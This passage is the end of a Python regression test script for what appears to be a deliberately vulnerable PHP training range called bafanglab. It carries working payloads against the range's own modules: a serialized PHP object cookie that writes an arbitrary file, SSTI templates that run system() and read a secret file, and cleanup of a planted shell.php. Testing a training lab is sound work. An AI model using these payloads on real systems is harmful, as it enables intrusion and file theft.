# 跨平台：使用项目根下的 uploads 目录（正斜杠在 Win/Linux PHP 中均可用）
logfile = UPLOAD_DIR + '/uns_auto.txt'
payload = 'O:6:"Logger":2:{s:7:"logfile";s:%d:"%s";s:3:"msg";s:11:"UNS_AUTO_OK";}' % (len(logfile), logfile)
cookie_val = urllib.parse.quote(base64.b64encode(payload.encode()).decode(), safe='')
r = requests.get(BASE + '/modules/unserialize/index.php', timeout=30, verify=False,
                 headers={'Cookie': 'prefs=' + cookie_val,
                          'User-Agent': 'bafanglab-auto-test/1.0'})
check('反序列化请求正常', r.status_code == 200)
r = get('/uploads/uns_auto.txt')
check('__destruct 任意文件写', 'UNS_AUTO_OK' in r.text)
try:
    os.remove(uns_file)
except OSError:
    pass

# ---------- 17. 模块16 SSTI ----------
section('[17] 模块16 SSTI 模板注入')
r = post('/modules/ssti/index.php', {'tpl': '{{7*7}}'})
check('SSTI 表达式求值 {{7*7}}=49', '49' in r.text)
r = post('/modules/ssti/index.php', {'tpl': "{{system('echo SSTI_RCE_OK')}}"})
check('SSTI 命令执行', 'SSTI_RCE_OK' in r.text)
ssti_flag = os.path.join(ROOT, 'modules', 'ssti', 'secret.txt').replace('\\', '/')
r = post('/modules/ssti/index.php', {'tpl': "{{file_get_contents('%s')}}" % ssti_flag})
check('SSTI 读取 secret.txt', '恭喜你完成本关挑战！' in r.text)
r = post('/modules/ssti/index.php', {'tpl': '{{nosuchfn(1)}}{{phpversion()}}'})
check('SSTI 异常表达式不致命', r.status_code == 200)

# ---------- 18. 环境自检 / 版本号 / 多语言 ----------
section('[18] 环境自检、版本号与 i18n')
r = get('/check.php')
check('check.php 可达且输出检测表', r.status_code == 200 and 'chk-table' in r.text,
      'HTTP %d' % r.status_code)
check('check.php 无「不通过」项', 'chk-fail' not in r.text)
r = get('/index.php')
check('首页 16 个模块横幅正常',
      '共 16 个训练模块' not in r.text and 'bafanglab v1.0.0' not in r.text
      and 'bafanglab Web 漏洞靶场' in r.text and '16 类漏洞场景' in r.text)
check('首页 16 张卡片均有贴底按钮区', r.text.count('class="card-actions"') == 16,
      '%d 个' % r.text.count('class="card-actions"'))
check('首页版本不再写死 PHP 7.3.4 NTS', 'PHP 7.3.4 NTS' not in r.text)
# about.php：三张 chk-table 教程表（长 GitHub 链接需靠 CSS 自动换行）
r = get('/about.php')
check('about.php 三张教程表格完整', r.status_code == 200 and r.text.count('chk-table') >= 3,
      'HTTP %d' % r.status_code)
# XXE 源码面板必须高亮第 23/26 行（开启实体加载器 + LIBXML_NOENT 外部实体替换点）
r = get('/modules/xxe/index.php')
check('XXE 源码高亮第 23/26 行（LIBXML_NOENT）',
      'class="src-line src-vuln"><span class="src-ln">23</span>' in r.text
      and 'class="src-line src-vuln"><span class="src-ln">26</span>' in r.text
      and 'LIBXML_NOENT' in r.text)

# 源码面板红行必须与源文件里的 @vuln 标记完全一致（防止手写行号再次漂移）
bad_hl = []
for p in src_pages:
    t = get(p).text
    m = re.search(r'<div class="src-meta">([^（<]+)', t)
    if not m:
        bad_hl.append(p + '(无源码面板)')
        continue
    fp = os.path.join(ROOT, m.group(1).strip().replace('/', os.sep))
    if not os.path.isfile(fp):
        bad_hl.append(p + '(%s 不存在)' % m.group(1).strip())
        continue
    with open(fp, 'r', encoding='utf-8', errors='replace') as f:
        want = [i + 1 for i, line in enumerate(f) if '@vuln' in line]
    got = [int(x) for x in re.findall(
        r'<span class="src-line src-vuln"><span class="src-ln">(\d+)</span>', t)]
    if not want:
        bad_hl.append(p + '(源文件没有 @vuln 标记)')
    elif want != got:
        bad_hl.append('%s(标记 %s / 高亮 %s)' % (p, want, got))
check('%d 个关卡页源码高亮与 @vuln 标记完全一致' % len(src_pages), not bad_hl,
      '异常: ' + '; '.join(bad_hl) if bad_hl else '全部一致')

# 全站简体中文扫一遍：每页 HTTP 200、无 PHP 报错、可见文案里不残留繁体字、
# 也不能把 nowdoc 里的 PHP 源码原样打印出来（曾因 nowdoc 不解析 PHP 而泄漏）
import re as _re
TRADITIONAL = set('體國學習來時間個為會說這對還點網頁碼檔連設計運動畫報單號證實現測試驗結錯誤請響確認刪編輯儲載輸內標題尋過濾顯隱範圍數據欄組態資訊選項鈕鏈構築錄製產處係統務檢裝環級擴維護複雜幫閱覽輕鬆嚴謹謀誰讓論詞譯課談謝謎豎豐貝負財貢貨貪貫責購賽贈贊贏趕趨躍軟輝輯輪輻輾轎邊辦辯農進遞遲遷遺遼郵鄭鄧釋鑒鑄長門閃閉問闖閏閑悶閘鬧閨聞閩閭閥閣閡閱闊闋闔闐闕隊陽陰陣階際陸隴陳陘陝隨隧險雲靜韋韜韓響頂頃項順須頌頑頒頓頗領頜頤頭頰頸頹頻顆顎顏願顛類顧顫顯顱顴風飄飆飛飢飯飲飴飼飽飾餃餅餉養餌餐餒餓餘餚餞館餬餽餾餿饅饉饋饌饍饑饒饔饕饗饘饛饜馬馮馭馳馴駁駒駕駛駝駟駡駢駭駱駿騁騎騙騷驀驁驃驄驅驊驍驕驚驛驟驢驥髕髖髮髯髻髭鬍須鬢鬥鬱魎魘魚魯鮑鮮鮫鮭鯉鯊鯛鯨鯰鰍鰓鰐鰭鰻鱉鱔鱘鱗鳥鳩鳴鴉鴨鴻鵑鵝鵡鵬鶉鶯鶴鶩鷂鷓鷸鷺鷹鹵鹼鹽麥麵麩黃黌點黨黷黲黴齋齒齡龍龐龔龜')
ZH_PAGES = [
    '/modules/burp/protocol.php', '/modules/burp/encode.php',
    '/modules/burp/dnslog.php', '/modules/burp/index.php', '/modules/burp/response.php',
    '/modules/burp/replay.php', '/modules/burp/price.php', '/modules/dirscan/index.php',
    '/modules/fuzz/index.php',
    '/modules/jsleak/index.php', '/modules/jsleak/unauth.php', '/modules/brute/index.php',
    '/modules/brute/captcha.php', '/modules/xss/reflect.php', '/modules/xss/stored.php',
    '/modules/xss/dom.php', '/modules/xss/upload.php', '/modules/xss/platform.php',
    '/modules/sqli/get.php', '/modules/sqli/post.php',
    '/modules/sqli/error.php', '/modules/sqli/blind.php', '/modules/sqli/time.php',
    '/modules/sqli/outfile.php',
    '/modules/xxe/index.php', '/modules/upload/index.php', '/modules/fileinc/index.php',
    '/modules/csrf/index.php', '/modules/ssrf/index.php', '/modules/fileread/index.php',
    '/modules/rce/index.php', '/modules/rce/code.php', '/modules/unserialize/index.php',
    '/modules/ssti/index.php',
]


def _visible(html):
    """去掉源码面板、注释，只留用户可见文案"""
    html = _re.sub(r'<div id="lvlSrc".*?</pre></div>', '', html, flags=_re.S)
    html = _re.sub(r'<div id="lvlFix".*?</pre></div>', '', html, flags=_re.S)
    html = _re.sub(r'<!--.*?-->', '', html, flags=_re.S)
    html = _re.sub(r'/\*.*?\*/', '', html, flags=_re.S)
    html = '\n'.join(l for l in html.split('\n')
                     if not _re.match(r'^\s*(//|\*)', l))
    return html


bad_http, bad_err, bad_tw, bad_php = [], [], [], []
for _p in ZH_PAGES:
    _r = requests.get(BASE + _p, timeout=30, verify=False)
    if _r.status_code != 200:
        bad_http.append(_p)
    if _re.search(r'(?:Warning|Notice|Deprecated|Fatal error|Parse error):', _r.text):
        bad_err.append(_p)
    _v = _visible(_r.text)
    if any(ch in TRADITIONAL for ch in _v):
        bad_tw.append(_p)
    if _re.search(r'<\?php echo', _v):
        bad_php.append(_p)
check('%d 个页面均 HTTP 200' % len(ZH_PAGES), not bad_http, ', '.join(bad_http[:3]) or 'all ok')
check('%d 个页面无 PHP 报错' % len(ZH_PAGES), not bad_err, ', '.join(bad_err[:3]) or 'all ok')
check('简体模式无繁体字残留', not bad_tw, ', '.join(bad_tw[:3]) or 'all ok')
check('简体模式无 PHP 原始码泄漏', not bad_php, ', '.join(bad_php[:3]) or 'all ok')

# 源码面板里的相对路径（Windows 下要显示成正斜杠，且不能为空）
r = get('/modules/xss/dom.php')
m = _re.search(r'<div class="src-meta">([^<]*)</div>', r.text)
_meta = m.group(1) if m else ''
check('源码面板显示相对路径', _meta.startswith('modules/xss/dom.php'), _meta[:40] or 'empty')

# ---------- 19. 清理测试数据 ----------
section('[19] 清理测试数据')
# 兜底删除 uploads 残留文件（正常流程已删，此处防止中途失败残留）
clean_list = [
    ('test_auto.jpg', UPLOAD_DIR),
    ('uns_auto.txt', UPLOAD_DIR),
    ('auto_xss.html', os.path.join(UPLOAD_DIR, 'xss')),
    ('flag.txt', os.path.join(ROOT, 'modules', 'sqli', 'files')),
    ('shell.php', os.path.join(ROOT, 'modules', 'sqli', 'files')),
]
for fname, fdir in clean_list:
    fpath = os.path.join(fdir, fname)
    try:
        if os.path.exists(fpath):
            os.remove(fpath)
            print('[CLEAN] 删除残留文件 uploads/%s' % fname)
    except OSError:
        pass
# 调用 install.php 全量重置：清除 comments 表 auto_test 测试留言、
# 恢复 users 表 test 用户邮箱（CSRF 测试改为 auto_csrf@bafanglab.local）等全部测试改动
r = post('/install.php')
check('install.php 重置还原测试数据', r.status_code == 200 and '安装完成' in r.text,
      'HTTP %d' % r.status_code)

# ---------- 汇总（控制台 + 报告文件） ----------
total = PASS + FAIL
rate = (PASS * 100.0 / total) if total else 0.0
print('\n' + '=' * 60)
print(' 测试完成：通过 %d 项，失败 %d 项，通过率 %.1f%%' % (PASS, FAIL, rate))
print(' 结果：' + ('全部通过，靶场功能正常。' if FAIL == 0 else '存在失败项，请检查上方 [FAIL] 条目。'))
print(' 测试报告：%s' % REPORT_PATH)
print('=' * 60)

with open(REPORT_PATH, 'a', encoding='utf-8') as f:
    f.write('=' * 60 + '\n')
    f.write('分模块通过率\n')
    f.write('-' * 60 + '\n')
    for sec_name, p, fl in _SECTIONS:
        t = p + fl
        f.write('  %s： %d/%d（%.1f%%）\n'
                % (sec_name, p, t, (p * 100.0 / t) if t else 0.0))
    f.write('-' * 60 + '\n')
    f.write('总计: 通过 %d / %d 项，通过率 %.1f%%，失败 %d 项\n' % (PASS, total, rate, FAIL))
    f.write('结束时间: %s\n' % time.strftime('%Y-%m-%d %H:%M:%S'))
    f.write('结果: %s\n' % ('全部通过，靶场功能正常。' if FAIL == 0 else '存在失败项，请检查 [FAIL] 条目。'))

sys.exit(0 if FAIL == 0 else 1)
